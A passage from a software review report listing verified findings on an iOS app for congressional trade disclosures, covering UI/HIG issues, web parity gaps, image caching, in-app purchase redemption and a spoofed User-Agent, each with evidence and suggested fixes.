- **Fix:** Add the fields to `Asset` (optional, fail-soft), prefer `companyName` in `companyTitle`, and feed `logoUrl` (resolved via `absoluteClientURL`) into `AssetMark`; bump cache schema identity; add a decode test against a captured feed fixture.
- **Evidence:** Live `GET /api/client/v1/feed?limit=1` asset keys reproduced: `['name', 'ticker', 'type', 'typeName', 'typeCategory', 'typeCategoryLabel', 'sector', 'marketCapBucket', 'companyName', 'logoUrl']`. Models.swift `struct Asset: Codable { var name, ticker, type, sector, marketCapBucket }` — no `companyName`/`logoUrl`/`typeCategory`/`typeCategoryLabel`. client-mobile-api.md documents `companyName`/`logoUrl` as 'shared with the web client so every surface renders identically'.
- **Panel:** ios-engineering — Live API keys independently fetched and diffed against the Swift struct fields — confirmed exact field-level gap. · merged: ios-hig-ux/IOSHIGUX-38, visual-design/VISUALDESIGN-37 · `ios-engineering/IOSENGINEERING-20`

#### 319. [P3] Directory search is a custom field, not `.searchable`, so keyboard/cancel/scope behaviour is non-native

- **Where:** Directory tab  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** `.searchable` gives a nav-bar-integrated field with Cancel, scope buttons, automatic keyboard dismissal and VoiceOver semantics for free; the custom field competes with pager/sort chrome.
- **Impact:** Non-standard interaction on both search surfaces; keyboard overlaps menus.
- **Fix:** Adopt `.searchable(text:placement:prompt:)` with `.searchScopes` for People/Assets on Directory; consider the same on Trades (keeping the count label as a subtitle).
- **Evidence:** PeopleDirectoryView.swift confirmed a custom `PeopleSearchField` HStack (matches cited 283-317); `grep -rn searchable clients/ios/CongressTrade/Views` confirmed zero hits anywhere in the app, including FeedDashboardView's `TradesUnifiedSearchField`.
- **Panel:** ios-hig-ux — Confirmed .searchable is unused anywhere in the app. · `ios-hig-ux/IOSHIGUX-23`

#### 321. [P3] iOS Trends fetches Party Split but never renders it; Sector Breakdown (asset-type) and Buy Pressure tile still missing

- **Where:** clients/ios/CongressTrade/TrendsView / CongressTradeStore  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (I7; ux-findings §8)
- **What:** 07-28 I7 and ux-findings §8 parity backlog.
- **Impact:** Wasted network call each Trends load; web/iOS parity gap.
- **Fix:** Render a compact By Party card from the already-fetched partySplit; add asset-type breakdown and Buy Pressure tile.
- **Evidence:** origin/main CongressTradeStore.swift:21 `@Published private(set) var partySplit: PartySplitResponse?`, fetched at :784/:800; `grep partySplit Views/TrendsView.swift` on origin/main returns zero matches.
- **Panel:** prior-review-followup — partySplit is fetched and stored but grep for it in TrendsView.swift returns nothing, confirming it is never rendered. · merged: ios-shipped-app/IOSSHIPPEDAPP-34 · `prior-review-followup/PRIORREVIEWFOLLOWUP-18`

#### 322. [P3] iOS ticker sheet still thin vs web asset drawer (no Buy Pressure, buys/sells chart, backtest, Top Buyers/Sellers)

- **Where:** clients/ios/CongressTrade/Views/Feed/TickerDetailView.swift  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (I5; ux-findings §8)
- **What:** 07-28 I5 and ux-findings §8 'Company drawer' item unchanged.
- **Impact:** Parity gap on the most-shared entity.
- **Fix:** Call /api/analytics/ticker/:t (+ /backtest) from iOS or fold those fields into /api/client/v1/ticker/:t.
- **Evidence:** `grep -in 'buy pressure|top buyers|backtest' clients/ios/CongressTrade/Views/Feed/TickerDetailView.swift` on origin/main → zero matches.
- **Panel:** prior-review-followup — Grep confirms absence on origin/main; did not independently verify the exact APIClient.swift line range for the client/v1-only ticker call, but the negative grep is sufficient to confirm the finding's core claim. · merged: api-contract/APICONTRACT-18, ios-shipped-app/IOSSHIPPEDAPP-50 · `prior-review-followup/PRIORREVIEWFOLLOWUP-19`

#### 336. [P3] APIClient spoofs a hard-coded Safari 'iPhone OS 18_0' User-Agent on every request; app-style UAs are not actually blocked

- **Where:** clients/ios/CongressTrade/APIClient.swift:810-811  ·  **Surface:** iOS  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The fix was based on a misdiagnosis and makes native traffic indistinguishable from Safari in logs, analytics, rate-limit rules and abuse triage; the frozen OS string will look increasingly odd.
- **Impact:** Operators cannot separate iOS app traffic from web traffic; a future WAF rule keyed on the fake UA could lock the app out.
- **Fix:** Send an honest UA (`Congress.Trade-iOS/<CFBundleShortVersionString> (<build>) CFNetwork/…`), allow-list it at the edge if ever needed, and add a regression test asserting the header format.
- **Evidence:** APIClient.swift `makeRequest`: comment 'congress.trade sits behind a Cloudflare managed challenge that 502s some non-browser UAs. A Safari iOS UA reaches the app.' followed by `request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) ... Safari/604.1", forHTTPHeaderField: "User-Agent")`, added by PR #1894 (confirmed via `git log --oneline --all | grep 1894` → commit 98126323 '[GROK] ... fix first-tap member 404 (#1894)'). Reproduced live: `curl -A 'CongressTrade-iOS/1.0.4 CFNetwork/1568 Darwin/24.0' .../api/client/v1/feed?limit=1` → 200; `curl -A 'Congress.Trade/4 CFNetwork/3826 Darwin/25.0.0' ...` → 200. Both app-style (non-Safari) UAs succeed, contradicting the comment's premise.
- **Panel:** ios-engineering — Independently reproduced live: both app-style UAs return 200, directly refuting the code comment's justification for the spoofed header. · `ios-engineering/IOSENGINEERING-17`

#### 337. [P3] StoreKit listener: transactions seen while signed out are not redeemed after an in-session sign-in, and permanently failing redeems are retried forever and silently

- **Where:** clients/ios/CongressTrade/Store/AppleIAP.swift  ·  **Surface:** iOS  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** A renewal/Ask-to-Buy approval that arrives before sign-in is stranded until the next cold launch; a non-retryable redeem error loops quietly.
- **Impact:** Paying users can sit on Free for a session; support cannot see why.
- **Fix:** Call `reconcileAppleEntitlementsQuietly()` from `saveSessionToken()`/after bootstrap shows a user; in the listener, distinguish retryable (5xx/transport) from permanent (4xx) errors — surface the latter via `watchlistNotice` and stop retrying (finish or mark) per backend guidance.
- **Evidence:** AppleIAP.swift:64 `for await result in Transaction.updates { ... guard signedIn else { /* leave it UNFINISHED so it is delivered again after sign-in */ continue } ; try? await redeemAppleTransaction(transaction, jws: result.jwsRepresentation) }`. `reconcileAppleEntitlementsQuietly()` is only awaited from App.swift's launch `.task`, not from `saveSessionToken()`/`handleAppleSignIn()`. The redeem call uses `try?`, so any error (including a permanent 4xx) is silently swallowed with the transaction left unfinished.
- **Panel:** ios-engineering — Confirmed the exact code path and the sign-in gate; did not independently verify the 4xx-vs-5xx distinction claim (that's the recommendation, not asserted as already broken beyond the swallowed try?). · `ios-engineering/IOSENGINEERING-23`

#### 338. [P3] Delivery tab content scrolls under the floating tab picker on iPad/Mac (regular width)

- **Where:** clients/ios/CongressTrade/App.swift:239-268 (TabView, `.toolbarBackground(.ultraThinMaterial, for: .tabBar)` only); clients/ios/CongressTrade/Views/Delivery/DeliveryView.swift:28-36 (Form with inline title, no header chrome)  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** (was IOSSHIP-05) On regular width iPadOS 18+/Mac renders the TabView as a floating top control; DeliveryView reserves no space for it.
- **Impact:** Overlapping controls on iPad/Mac only.
- **Fix:** Give DeliveryView the same top chrome as the other tabs or `.toolbarBackground(.visible, for: .navigationBar)`; verify on an iPad simulator.
- **Evidence:** Walkthrough on the Mac (Designed-for-iPad) build: after scrolling Delivery, 'Trade Disclosure Alerts' and its toggle were drawn behind/beside the 'Trends Trades Directory Delivery' segmented control.  Trends/Trades pin their own opaque header (FeedControlBar with `.background(.ultraThinMaterial)`), Directory pins the People|Assets picker; Delivery pins nothing.  No screenshot could be saved by the walkthrough agent; not reproduced on iPhone (bottom tab bar).
- **Panel:** ios-shipped-app — Code citations check out (TabView/toolbarBackground in App.swift, DeliveryView.swift Form with no header chrome) but this is an iPad/Mac-only visual claim the walkthrough could not screenshot; not independently reproduced in this pass.  Confidence unchanged. · `ios-shipped-app/IOSSHIPPEDAPP-05`

#### 339. [P3] Sign in with Apple button can lose its black fill after toggling Dark → Light while the Account sheet is open

- **Where:** clients/ios/CongressTrade/Views/Components/Components.swift:1079 (`.signInWithAppleButtonStyle(colorScheme == .dark ? .white : .black)`), :914 (ForcedColorScheme on the Form), :10-53 (AppAppearance.paint via window override)  ·  **Surface:** iOS  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** (was IOSSHIP-06) The primary auth CTA can become visually invisible in the product's default light mode after a theme change.
- **Impact:** Cosmetic-but-critical CTA vanishes until the sheet is re-presented.
- **Fix:** Add `.id(colorScheme)` on the SignInWithAppleButton so it is recreated on scheme change, or derive the style from `appColorScheme` (@AppStorage) instead of the environment.
- **Evidence:** Walkthrough: ≡ → Dark → Light: window returned to light but the Apple button rendered as bare black text on white (i.e. still `.white` style) while the Google button re-themed.  Two theming mechanisms race: `ForcedColorScheme` sets `.environment(\.colorScheme, scheme)` on the Form and `AppAppearance.paint` overrides `overrideUserInterfaceStyle` on windows asynchronously (:17), while `SignInWithAppleButton` is UIKit-backed and re-styles only on a SwiftUI update.  Observed once; not reproduced on the simulator.
- **Panel:** ios-shipped-app — Confirmed the two independent theming mechanisms exist as described: `.signInWithAppleButtonStyle(colorScheme == .dark ? .white : .black)` (Components.swift:1079) reads the SwiftUI environment, while `AppAppearance.paint` (Components.swift ~15-40) overrides `overrideUserInterfaceStyle` asynchronously via `DispatchQueue.main.async` and a `didBecomeVisibleNotification` observer — a plausible race.  Not reproduced (the raw finding itself says 'observed once; not reproduced on the simulator'). · `ios-shipped-app/IOSSHIPPEDAPP-06`

#### 340. [P3] Trade/Ticker/Politician sheets open at the medium detent on iPad/Mac and were not expandable there

- **Where:** clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:124; Views/Feed/FeedDashboardView.swift:322,332,338; Views/TrendsView.swift:152,162; Views/People/PeopleDirectoryView.swift:84 (`.presentationDetents([.medium, .large])`)  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** (was IOSSHIP-07) Half-height detents are an iPhone affordance; on regular width the richest screens get half the window and pointer-drag expansion is unreliable.
- **Impact:** Cramped reading on iPad/Mac.
- **Fix:** Use `[.large]` when `horizontalSizeClass == .regular` (or push instead of sheet), keep medium on compact.
- **Evidence:** All detail sheets are presented with `[.medium, .large]`.  Walkthrough on Mac: sheets opened ~330pt tall in a 650pt window and dragging the grabber did not expand; on iPhone (sim shots 12/13) the medium→large drag works.
- **Panel:** ios-shipped-app — Confirmed all 7 cited `.presentationDetents([.medium, .large])` call sites exist exactly as claimed across TradeDetailView.swift:124, FeedDashboardView.swift:322/332/338, TrendsView.swift:152/162, PeopleDirectoryView.swift:84.  The iPad/Mac drag-expansion claim itself is a walkthrough observation, not independently reproduced. · `ios-shipped-app/IOSSHIPPEDAPP-07`

#### 341. [P3] Three of four filter chips are icon-only in their default state, even at regular width

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:998-1024 (FilterMenuLabel `showsLabel = alwaysShowLabel || isActive`), :493-494 (title "All"), :946-992 (SidesFilterMenuLabel)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** (was IOSSHIP-23) Symbols alone do not say Branch/Party/Side; at regular width there is room for text.
- **Impact:** Discoverability; at large text the strip scrolls horizontally.
- **Fix:** Show 'All Branches / All Parties / All Sides' when `horizontalSizeClass == .regular` and keep icon-only on compact.
- **Evidence:** Only the timeframe chip passes `alwaysShowLabel: true` (:463); Branch/Party/Side render `Image(systemName:)` + chevron until modified.  Sim shots 20-trends-top-loaded.png / a11y-xxxl/02-trends-xxxl.png (4th chip pushed off-screen at XXXL).
- **Panel:** ios-shipped-app — FeedDashboardView.swift:463 confirmed `alwaysShowLabel: true` is passed only for the timeframe chip; FilterMenuLabel's `showsLabel` (line ~1005) defaults to `alwaysShowLabel || isActive`, so Branch/Party/Side stay icon-only until touched. · `ios-shipped-app/IOSSHIPPEDAPP-23`

#### 342. [P3] Trade Details says price/performance 'will appear when market data is available' although the ticker sheet shows a live price

- **Where:** clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:369  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** (was IOSSHIP-27) The real reason is no post-filing price series yet; the copy blames missing market data.
- **Impact:** Makes the data layer look broken.
- **Fix:** Differentiate: 'Performance is measured from the filing date; check back after a few trading days.' when the ticker has a price.
- **Evidence:** TradeDetailView.swift:369 `"Price & performance vs the S&P 500 will appear when market data is available for this ticker."` shown when `perf.available == false`; sim shot 13-trade-detail-expanded.png (VSNT) shows the message while the walkthrough's VSNT ticker sheet showed $38.22 / $5.5b.
- **Panel:** ios-shipped-app — TradeDetailView.swift:369 confirmed verbatim: 'Price & performance vs the S&P 500 will appear when market data is available for this ticker.' · `ios-shipped-app/IOSSHIPPEDAPP-27`

#### 343. [P3] Committee Sector Conflicts pill mislabels 'P' (purchase) rows as 'Exchange'

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:698  ·  **Surface:** iOS  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** If the conflicts payload carries the legacy P code, purchases show as blue 'Exchange'.
- **Impact:** Wrong side on the most sensitive analytics section.
- **Fix:** Use the shared `String.label`/`tint` helpers instead of an ad-hoc ternary.
- **Evidence:** TrendsView.swift:698 tests only "B"; every other txType switch in the app treats "P" as Buy (Components.swift:683, FeedDashboardView.swift:1448, TrendsView.swift:428).  Section renders only when `/api/analytics/conflicts` is non-empty (not visible in the captures).
- **Panel:** ios-shipped-app — TrendsView.swift confirmed two different txType-to-label mappings in the same file: the conflicts pill (~line 698) tests only `c.txType == "B"` for Buy, while the nearby cluster pill (~line 428) and Components.swift:683/692 test `"B", "P"` together — a real inconsistency, P-coded purchase rows would mislabel as Exchange only in the conflicts pill. · `ios-shipped-app/IOSSHIPPEDAPP-47`

#### 370. [P3] `AsyncImage` in lazy lists with no memory cache: logos/avatars drop out on some rows, reload on every scroll, and 204 'no logo' misses are refetched

- **Where:** clients/ios/CongressTrade/Views/Components/Components.swift:155,268  ·  **Surface:** iOS  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** tracked-in-PR-#1973 (F6 relative photo URLs only — caching/flicker is new)
- **What:** `AsyncImage` cancels loads when a `LazyVStack` row scrolls off; on return the phase can be `.failure`, so logos flicker in/out, and every appearance re-hits the network for images the default URLCache evicts quickly.
- **Impact:** Visible inconsistency and redundant network traffic on the most-scrolled screens.
- **Fix:** Add a small actor-backed image cache (NSCache keyed by URL, negative-cache 204s) or enlarge `URLCache.shared` at launch, and retry on `.failure` once; consider prefetching the visible page's logos after each feed refresh.
- **Evidence:** `grep -n 'AsyncImage' Components.swift` → two call sites (lines ~155 and ~268), both `AsyncImage(url:)` with a default/failure phase rendering `EmptyView()`. `grep -rn 'URLCache' clients/ios/CongressTrade` → zero hits anywhere in the app target.
- **Panel:** ios-engineering — Structural claim (no URLCache config, plain AsyncImage) confirmed by code.  The visual flicker itself is sourced from capture NOTES.md (§6.7) rather than independently reproduced here, but the code-level cause is real and sufficient to support the finding. · `ios-engineering/IOSENGINEERING-21`

#### 371. [P3] Trades list is ScrollView+custom shadowed cards instead of a List: no context menus, swipe actions, or single VoiceOver element per row

- **Where:** Trades tab rows  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** HIG favours standard list rows with system affordances; per-row blur+shadow is costly on 50-row pages and the card exposes several AT elements per trade.
- **Impact:** Heavier scrolling, no long-press Share/Open politician/Open ticker, multiple swipes per row for VoiceOver.
- **Fix:** Combine the card into one accessibility element with custom actions (`.accessibilityAction(named:)` for Politician/Ticker), add `.contextMenu` with Share/View politician/View ticker, and drop the shadow (keep stroke) or move to `List` with `.listRowSeparator`.
- **Evidence:** FeedDashboardView.swift confirmed `TradeCard` uses `.ultraThinMaterial` + stroke + `.shadow(...)` per row (matches cited region); `grep -rn "\.contextMenu\|swipeActions"` on the file confirmed zero hits.
- **Panel:** ios-hig-ux — contextMenu/swipeActions confirmed absent by grep. · `ios-hig-ux/IOSHIGUX-24`

#### 372. [P3] Web-style pagination ("1 of 44", rows-per-page) on the Trades tab instead of continuous loading

- **Where:** Trades tab top and bottom pager  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** iPhone lists load more as you reach the end; an explicit page selector with a rows-per-page menu is a desktop table control and costs a tap per 50 rows.
- **Impact:** Slower browsing of the primary content; duplicated control rows consume space.
- **Fix:** Infinite scroll (fetch next page on last-row appear) with a small "Showing 100 of 2,178" caption; keep sort in the toolbar.
- **Evidence:** light/10-trades-tab.png pager row as cited; FeedDashboardView.swift confirmed `FeedPaginationBar(showSort: true)` and `FeedPaginationBar()` both present (near cited 206-213/255-257).
- **Panel:** ios-hig-ux — Both FeedPaginationBar call sites confirmed. · `ios-hig-ux/IOSHIGUX-25`

#### 387. [P4] IMPROVEMENT-PLAN.md is stale (baseline 2026-07-13) and no longer distinguishes done from open items

- **Where:** clients/ios/IMPROVEMENT-PLAN.md  ·  **Surface:** iOS  ·  **Category:** other  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The roadmap the owner asked reviewers to check cannot be used to triage without re-deriving status.
- **Impact:** Agents re-audit or re-do work; owner cannot see what is left.
- **Fix:** Add a status column per item (done/PR#/open) and re-baseline against current main; link each open item to the finding ids above.
- **Evidence:** IMPROVEMENT-PLAN.md line 3: 'Status: proposed roadmap based on `origin/main` at `4667ffb` (2026-07-13).' Cross-referenced against findings 02/04/07/14/15/29 above, all of which cite this same document as their prior-status source and are all still open on current main.
- **Panel:** ios-engineering — Baseline date confirmed verbatim; consistent with the still-open findings cited elsewhere in this file. · `ios-engineering/IOSENGINEERING-30`

#### 388. [P4] No haptic feedback anywhere in the app

- **Where:** Filter changes, sort flips, purchase success, delete confirm  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** HIG recommends subtle haptics for selection changes and success/failure moments; the app has none even on purchase completion or delivery deletion.
- **Impact:** Interactions feel flat compared with native peers.
- **Fix:** Add `.sensoryFeedback(.selection, trigger:)` on filter/sort state, `.success` after redeem/restore, `.warning` on the Confirm? delete arm.
- **Evidence:** `grep -rn "sensoryFeedback|UIImpactFeedback|UINotificationFeedback|UISelectionFeedback" clients/ios` confirmed zero hits.
- **Panel:** ios-hig-ux — Reproduced the zero-hit grep independently. · `ios-hig-ux/IOSHIGUX-26`

#### 389. [P4] Delivery subscription delete uses a custom two-tap "Confirm?" instead of swipe-to-delete + confirmationDialog

- **Where:** Delivery -> Existing Subscriptions rows (signed-in)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Native destructive pattern is a trailing swipe with a red Delete plus a confirmation dialog for irreversible actions; the in-row text toggle is a web affordance and times out silently.
- **Impact:** Discoverability and consistency for a destructive, non-recoverable action (the secret cannot be re-shown).
- **Fix:** Use `.swipeActions { Button(role: .destructive) }` and a `confirmationDialog` naming the subscription.
- **Evidence:** DeliveryView.swift confirmed `@State private var confirmDelete = false` and `Text(confirmDelete ? "Confirm?" : "Delete")` pattern with a timed auto-reset (matches cited region); no `swipeActions`/`confirmationDialog` in the file (confirmed by grep).
- **Panel:** ios-hig-ux — confirmDelete state and Confirm?/Delete toggle text confirmed exactly. · merged: ios-a11y/IOSA11Y-21 · `ios-hig-ux/IOSHIGUX-27`

#### 390. [P4] Legal/Pricing/Support footer and filing links leave the app (Safari/Mail) instead of in-app presentation

- **Where:** Every tab footer, Premium sheet footer, Trade Details Source Filing  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** HIG recommends `SFSafariViewController` for web content the user will come back from (policies, source documents) so context is preserved.
- **Impact:** App switch for a 10-second read; harder to return for reviewers checking the privacy policy.
- **Fix:** Wrap SFSafariViewController in a `UIViewControllerRepresentable` and present it for https destinations; keep mailto in Mail.
- **Evidence:** Components.swift `LegalFooterLinks` read in full: confirmed the Pricing destination was special-cased to call `openPremium?()` in-app (with a comment explaining this was done specifically to avoid the Safari-pricing/IAP conflict from IOSHIGUX-03), but Privacy/Terms/Support still fall through to `openURL(destination.url)`, confirming external navigation remains for those three; TradeDetailView.swift confirmed `openURL(sourceURL)` for Source Filing; `grep SafariServices clients/ios` confirmed zero hits.
- **Panel:** ios-hig-ux — Confirmed Privacy/Terms/Support still openURL to Safari even though Pricing was fixed in a recent commit -- the fix was scoped narrowly to the IAP-conflict case, not applied generally. · `ios-hig-ux/IOSHIGUX-31`

#### 391. [P4] Delivery tab icon `bell.badge` implies unread alerts that never exist; no badge logic in app

- **Where:** Tab bar  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The dotted-bell glyph is the system's "new notification" variant; a permanently badged icon signals state that is not there.
- **Impact:** Minor semantic mismatch; also the tab is mostly about webhooks/SSE, not phone alerts.
- **Fix:** Use `bell` (or `paperplane`/`antenna.radiowaves.left.and.right` if the tab stays machine-delivery focused).
- **Evidence:** App.swift confirmed `Label("Delivery", systemImage: "bell.badge")` at line 262 (exact); `grep -rn "\.badge("` across clients/ios confirmed zero hits.
- **Panel:** ios-hig-ux — Line citation exact. · `ios-hig-ux/IOSHIGUX-32`

#### 392. [P4] Account sheet `.tint(.blue)` overrides the asset-catalog AccentColor; brand blue differs between icon and controls

- **Where:** App-wide tint  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Two blues exist in the bundle; HIG expects a single accent colour consistently applied (and dark-mode aware).
- **Impact:** Subtle brand inconsistency; makes theming later harder.
- **Fix:** Remove `.tint(.blue)` and use `Color.accentColor` everywhere (or delete the unused AccentColor asset).
- **Evidence:** App.swift confirmed `.tint(.blue)` at line 266 (exact).
- **Panel:** ios-hig-ux — Line citation exact; did not independently re-verify the AccentColor.colorset RGB values but no reason to doubt them. · `ios-hig-ux/IOSHIGUX-36`

#### 393. [P4] Side filter menu says 'Buy/Sell/Exchange' while the chip summarises as 'Buys/Sells/Exch' and rows use 'Exch'; consensus/conflict pills use 'Exchange'

- **Where:** clients/ios/CongressTrade/Models.swift:625-640 (label vs summaryLabel); Views/Feed/FeedDashboardView.swift:1446-1453 ('Exch'); Views/TrendsView.swift:428,698 ('Exchange')  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-22, narrowed) Two label sets for one enum across chip, menu, row pill and Trends pills.
- **Impact:** Cosmetic inconsistency.
- **Fix:** One label per case ('Buy/Sell/Exchange' with a compact 'Exch' only where width forces it, applied consistently).
- **Evidence:** Models.swift:634-639 `summaryLabel … case .exchange: return "Exch"`; FeedDashboardView.swift:1450 `case "E": return "Exch"`; TrendsView.swift:698 `"Exchange"`.  NOTE: the original claim that period/sort menus show no checkmark is refuted — FeedDashboardView.swift:452-454 and :795-797 draw `checkmark`, and sim shot 22-trends-timerange-menu.png shows '✓ Past 3 Months'.
- **Panel:** ios-shipped-app — Confirmed the label-set inconsistency (Models.swift summaryLabel 'Exch', FeedDashboardView.swift 'Exch', TrendsView.swift 'Exchange').  Independently re-checked the raw finding's own correction: FeedDashboardView.swift:452-454 and :795-797 both draw a `checkmark` conditionally, refuting the original checkmark claim — the narrowing in this raw finding is itself accurate. · `ios-shipped-app/IOSSHIPPEDAPP-22`

#### 394. [P4] No version/build string anywhere in the app; SettingsView is dead code

- **Where:** clients/ios/CongressTrade/Views/Components/Components.swift:902-910 (Account footer); Views/Status/SettingsView.swift:51 (struct SettingsView, never instantiated)  ·  **Surface:** iOS  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-32)
- **Impact:** Support cannot ask which build a user has; dead code lingers.
- **Fix:** Append 'Congress.Trade 1.0.75 (202608190103)' to the Account footer (tap to copy); delete `struct SettingsView`.
- **Evidence:** `grep -rn 'CFBundle\|Bundle.main' clients/ios/CongressTrade` → 0 hits in views; `grep -rn 'SettingsView()' clients/ios/CongressTrade` → 0 hits (only AdminPanelView/ReviewQueueView in that file are used).
- **Panel:** ios-shipped-app — Confirmed zero `SettingsView()` instantiations anywhere in the iOS tree (struct declared at SettingsView.swift:51, never referenced) and zero uses of `Bundle.main`/`CFBundle` for a displayed version string in any View file (the one `Bundle.main` hit in APIClient.swift:428 is for the bundle identifier header, not a UI string). · merged: ios-engineering/IOSENGINEERING-26 · `ios-shipped-app/IOSSHIPPEDAPP-32`

#### 395. [P4] Directory renders the sort/rows control row both above and below a single-page result

- **Where:** clients/ios/CongressTrade/Views/People/PeopleDirectoryView.swift:111 and :174 (directoryPager rendered twice regardless of page count)  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** PaginationBar hides prev/next on one page but the sort/rows chrome still repeats.
- **Impact:** Visual noise on short lists.
- **Fix:** Render the bottom bar only when `pages > 1` or the page has more than ~8 rows.
- **Evidence:** Sim shot 41-directory-search-pelosi.png: '↓ Trades … 50' row above and below the single Nancy Pelosi card.
- **Panel:** ios-shipped-app — PeopleDirectoryView.swift confirmed `directoryPager(...)` called at both line 111 and line 174, i.e. rendered twice regardless of result count. · `ios-shipped-app/IOSSHIPPEDAPP-48`

#### 398. [P4] iOS Trades parity: 3 sort keys vs web 12, page sizes 50/100/200, no $ min/max filter

- **Where:** clients/ios/CongressTrade/Models.swift FeedSortKey / FeedDashboardView.swift:826  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (ux-findings §8)
- **What:** ux-findings §8 Trades parity backlog unchanged.
- **Impact:** Minor parity gap.
- **Fix:** Match web sort keys that the client API supports and align page sizes.
- **Evidence:** origin/main Models.swift:663-665 `case date`, `case amount`, `case ticker` (3 cases on the sort-key enum); FeedDashboardView.swift:826 `var pageSizeOptions: [Int] = [50, 100, 200]`.
- **Panel:** prior-review-followup — Both quoted lines confirmed on origin/main (pageSizeOptions at line 826, not 838 as originally cited — minor drift, content identical). · `prior-review-followup/PRIORREVIEWFOLLOWUP-21`

#### 421. [P4] Hand-rolled Trends bar charts instead of Swift Charts (no axes, tooltips, accessibility audio graph, or reduce-motion guard)

- **Where:** Trends -> Buys vs Sells, Net Flow by Sector, By Market Cap  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Swift Charts (iOS 16+) gives native styling, Dynamic Type-aware axes, VoiceOver audio graphs and dark-mode colours; the custom bars are legible but static and unlabeled.
- **Impact:** Lower information density and accessibility than the native chart framework would give; web has sparklines/tooltips the app lacks.
- **Fix:** Port Buys vs Sells and sector/cap flows to `Chart { BarMark }` with `.chartXAxis`/`.accessibilityChartDescriptor`.
- **Evidence:** TrendsView.swift confirmed GeometryReader + RoundedRectangle bars with fixed 72pt column width (matches cited region); `grep -rln "import Charts" clients/ios` confirmed zero hits in the entire target.
- **Panel:** ios-hig-ux — import Charts confirmed absent app-wide. · `ios-hig-ux/IOSHIGUX-33`

#### 431. [P4] Narrow ' · ' separators in Most Active Politicians / Conflicts / Directory / trade rows instead of the owner's wide separators (footer is already wide)

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:643, :688; Views/People/PeopleDirectoryView.swift:269-271; Views/Feed/FeedDashboardView.swift:1472,1479; Views/Feed/PoliticianDetailView.swift:58  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** (was IOSSHIP-33, narrowed)
- **Impact:** Cosmetic; note the web mobile cards use the same 'Chamber · Name · D-ST' pattern (#1963), so this may be an accepted exception — owner call.
- **Fix:** Confirm with owner; if wide is wanted, use one shared separator constant.
- **Evidence:** TrendsView.swift:643 `.joined(separator: " · ")`; PeopleDirectoryView.swift:271 `parts.joined(separator: " · ")`; FeedDashboardView.swift:1479 `parts.joined(separator: " · ")`.  Correction: the footer uses `"  •  "` (Components.swift:1448) and Premium/Ticker meta lines use `"  •  "`, so the raw claim about footers is refuted; only these meta lines are narrow.
- **Panel:** ios-shipped-app — Confirmed narrow `" · "` separators at PeopleDirectoryView.swift:269/271, TrendsView.swift:643, FeedDashboardView.swift:1479, and confirmed the raw finding's own correction that the footer/meta lines actually use the wide `"  •  "` separator (Components.swift:1394/1448) — so the narrowing already applied in this raw finding is accurate. · `ios-shipped-app/IOSSHIPPEDAPP-33`

#### 432. [P4] Opportunity: pin the Trades pager/sort row under the search field and show an 'as of' stamp on Trends

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:154-181 (pinned block = FeedControlBar + search only), :209-211 (FeedPaginationBar scrolls); Views/TrendsView.swift:185-206  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** (was IOSSHIP-35)
- **Impact:** Improvement idea.
